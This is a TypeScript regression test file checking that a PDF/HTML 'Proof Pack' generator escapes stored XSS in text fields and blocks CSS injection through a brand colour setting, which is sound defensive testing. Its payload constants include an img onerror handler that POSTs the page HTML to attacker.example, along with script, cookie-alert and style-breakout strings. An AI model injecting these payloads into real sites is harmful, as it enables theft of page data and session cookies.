/**
 * Regression tests: stored XSS prevention in the Proof Pack HTML generator.
 *
 * Verifies that:
 * 1. Malicious content in user-supplied text fields is HTML-escaped before
 *    being placed in the document body.
 * 2. A malicious brandColor from documentTemplateSettings cannot inject HTML
 *    via the <style> block (CSS context injection).
 */

import { describe, it, expect } from 'vitest';
import { generateJobProofPackPDF } from '../pdfService';

// Minimal stub factories so tests stay self-contained.
function makeJob(overrides: Record<string, unknown> = {}) {
  return {
    id: 'job-1',
    number: 'J001',
    title: 'Test Job',
    status: 'done',
    address: '1 Main St',
    location: null,
    description: null,
    scheduledAt: null,
    startedAt: null,
    completedAt: null,
    createdAt: new Date('2024-01-01'),
    ...overrides,
  } as any;
}

function makeBusiness(overrides: Record<string, unknown> = {}) {
  return {
    businessName: 'Acme Co',
    abn: null,
    address: null,
    phone: null,
    email: null,
    logoUrl: null,
    documentTemplate: null,
    documentTemplateSettings: null,
    ...overrides,
  } as any;
}

function makeData(
  jobOverrides: Record<string, unknown> = {},
  business?: ReturnType<typeof makeBusiness>,
  extraData: Record<string, unknown> = {},
) {
  return {
    job: makeJob(jobOverrides),
    business: business ?? makeBusiness(),
    client: null,
    timeEntries: [],
    materials: [],
    photos: [],
    invoice: null,
    geofenceAlerts: [],
    complianceDocs: [],
    subcontractors: [],
    variations: [],
    swmsList: [],
    safetyForms: [],
    hideSections: {},
    retention: null,
    ...extraData,
  };
}

// XSS payloads that should never appear verbatim in the output.
const SCRIPT_PAYLOAD = '<script>alert(1)</script>';
const IMG_PAYLOAD = '<img src=x onerror="fetch(\'https://attacker.example/\',{method:\'POST\',body:document.documentElement.innerHTML})">';
const STYLE_BREAK_PAYLOAD = '</style><script>alert(1)</script><style>';

describe('Proof Pack XSS prevention — body text fields', () => {
  it('HTML-escapes a malicious job title', () => {
    const html = generateJobProofPackPDF(makeData({ title: SCRIPT_PAYLOAD }));
    expect(html).not.toContain(SCRIPT_PAYLOAD);
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('HTML-escapes a malicious job description', () => {
    const html = generateJobProofPackPDF(makeData({ description: IMG_PAYLOAD }));
    expect(html).not.toContain(IMG_PAYLOAD);
    // The unescaped executable attribute form must not be present.
    expect(html).not.toContain('onerror="');
    // The escaped form is expected to be present.
    expect(html).toContain('onerror=&quot;');
  });

  it('HTML-escapes a malicious job address', () => {
    const html = generateJobProofPackPDF(makeData({ address: SCRIPT_PAYLOAD }));
    expect(html).not.toContain(SCRIPT_PAYLOAD);
    expect(html).not.toContain('<script>');
  });

  it('HTML-escapes malicious material name and supplier', () => {
    const data = makeData({}, undefined, {
      materials: [
        { name: SCRIPT_PAYLOAD, supplier: IMG_PAYLOAD, status: 'ordered', quantity: '1', unitCost: '10.00', totalCost: '10.00' },
      ],
    });
    const html = generateJobProofPackPDF(data);
    expect(html).not.toContain(SCRIPT_PAYLOAD);
    expect(html).not.toContain(IMG_PAYLOAD);
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('onerror="');
  });

  it('HTML-escapes malicious variation title and description', () => {
    const data = makeData({}, undefined, {
      variations: [
        {
          number: 'V1',
          title: SCRIPT_PAYLOAD,
          description: IMG_PAYLOAD,
          reason: '<b onmouseover="alert(1)">test</b>',
          status: 'approved',
          totalAmount: '100.00',
          approvedByName: null,
          approvedAt: null,
          createdAt: null,
        },
      ],
    });
    const html = generateJobProofPackPDF(data);
    expect(html).not.toContain(SCRIPT_PAYLOAD);
    expect(html).not.toContain('onerror="');
    expect(html).not.toContain('onmouseover="');
  });

  it('HTML-escapes a malicious photo caption and category', () => {
    const data = makeData({}, undefined, {
      photos: [
        {
          url: 'https://example.com/photo.jpg',
          caption: SCRIPT_PAYLOAD,
          category: '<b>bad</b>',
          createdAt: new Date('2024-01-01'),
          latitude: null,
          longitude: null,
          address: null,
        },
      ],
    });
    const html = generateJobProofPackPDF(data);
    expect(html).not.toContain(SCRIPT_PAYLOAD);
    expect(html).not.toContain('<b>bad</b>');
  });

  it('HTML-escapes malicious safety form response values', () => {
    const data = makeData({}, undefined, {
      safetyForms: [
        {
          isJobCard: false,
          formType: 'safety',
          formName: 'Safety Check',
          submittedAt: '2024-01-01',
          submittedBy: null,
          status: 'pending',
          description: null,
          notes: SCRIPT_PAYLOAD,
          responses: [
            { label: 'Is site safe?', value: IMG_PAYLOAD },
          ],
        },
      ],
    });
    const html = generateJobProofPackPDF(data);
    expect(html).not.toContain(SCRIPT_PAYLOAD);
    expect(html).not.toContain(IMG_PAYLOAD);
    // Unescaped executable event-handler attribute must not be present.
    expect(html).not.toContain('onerror="');
  });
});

describe('Proof Pack XSS prevention — CSS brandColor injection', () => {
  const MALICIOUS_COLORS = [
    STYLE_BREAK_PAYLOAD,
    '</style><script>alert(document.cookie)</script>',
    'red; } body { background: url("javascript:alert(1)"); } .x {',
    '#ff0000</style><script>alert(1)</script>',
    'expression(alert(1))',
  ];

  for (const maliciousColor of MALICIOUS_COLORS) {
    it(`rejects malicious brandColor: ${maliciousColor.slice(0, 40)}…`, () => {
      const business = makeBusiness({
        documentTemplateSettings: {
          brandColors: { primary: maliciousColor },
        },
      });
      const html = generateJobProofPackPDF(makeData({}, business));
      // The payload must not appear verbatim in the style block or anywhere
      expect(html).not.toContain('</style><script>');
      expect(html).not.toContain('<script>');
      expect(html).not.toContain('onerror=');
    });
  }

  it('rejects a malicious overrideColor (accentColor parameter)', () => {
    const data = { ...makeData(), accentColor: STYLE_BREAK_PAYLOAD };
    const html = generateJobProofPackPDF(data);
    expect(html).not.toContain('</style><script>');
    expect(html).not.toContain('<script>');
  });

  it('accepts and preserves a valid 6-digit hex brandColor', () => {
    const business = makeBusiness({
      documentTemplateSettings: { brandColors: { primary: '#a1b2c3' } },
    });
    const html = generateJobProofPackPDF(makeData({}, business));
    expect(html).toContain('#a1b2c3');
  });

  it('accepts and preserves a valid 3-digit hex brandColor', () => {
    const business = makeBusiness({
      documentTemplateSettings: { brandColors: { primary: '#abc' } },
    });
    const html = generateJobProofPackPDF(makeData({}, business));
    expect(html).toContain('#abc');
  });

  it('falls back to the default color when brandColor is empty', () => {
    const business = makeBusiness({
      documentTemplateSettings: { brandColors: { primary: '' } },
    });
    const html = generateJobProofPackPDF(makeData({}, business));
    // Default accent color must be present
    expect(html).toContain('#1e3a5f');
  });
});
